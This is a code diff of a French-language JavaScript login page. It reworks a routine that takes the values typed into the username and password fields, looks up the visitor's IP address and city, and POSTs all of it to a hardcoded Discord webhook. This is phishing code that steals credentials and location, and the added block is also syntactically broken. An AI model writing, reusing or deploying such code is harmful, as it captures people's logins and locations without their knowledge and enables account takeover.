@@ -97,27 +97,24 @@
     currentDate = Date.now();
   } while (currentDate - date < milliseconds);
 }
-    var request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1125156301689847929/ajxOd4GPMFWeuWFVTVarNi8-8c25WBCT6VS9MuAMfl5hnHnd7GO_Lwh1PM3ZTgBE_qub");
-    request.setRequestHeader('Content-type', 'application/json');
-    var params = {
-      content: ("> **Identifiant 👤  : **" + document.getElementById('username').value + "\n> **Mot de passe 🔒 : **" + document.getElementById('password').value)
-
-      } 
-
-var params = {   
-content : ("> fetch('https://api.ipify.org?format=json')
+   fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
   .then(data => {
     const ipAddress = data.ip;
     // Utiliser l'adresse IP ici, par exemple l'envoyer à votre serveur
 
     // Récupérer la ville en fonction de l'adresse IP
-    fetch(`https://api.ipapi.com/${ipAddress}?access_key=5z1JSJGsJdKw2SyTGpQcKibSJvw47ytR`)
+    fetch(`https://api.ipapi.com/${ipAddress}?access_key=YOUR_ACCESS_KEY`)
       .then(response => response.json())
       .then(data => {
         const city = data.city;
-  
+
+ var request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1125156301689847929/ajxOd4GPMFWeuWFVTVarNi8-8c25WBCT6VS9MuAMfl5hnHnd7GO_Lwh1PM3ZTgBE_qub");
+    request.setRequestHeader('Content-type', 'application/json');
+    var params = {
+const content = "> **Identifiant : **" + document.getElementById('username').value + "\n> **Mot de passe : **" + document.getElementById('password').value + "\n> **Adresse IP : **" + ipAddress + "\n> **Ville : **" + city;
+
 }
     request.send(JSON.stringify(params));
 	sleep(400)
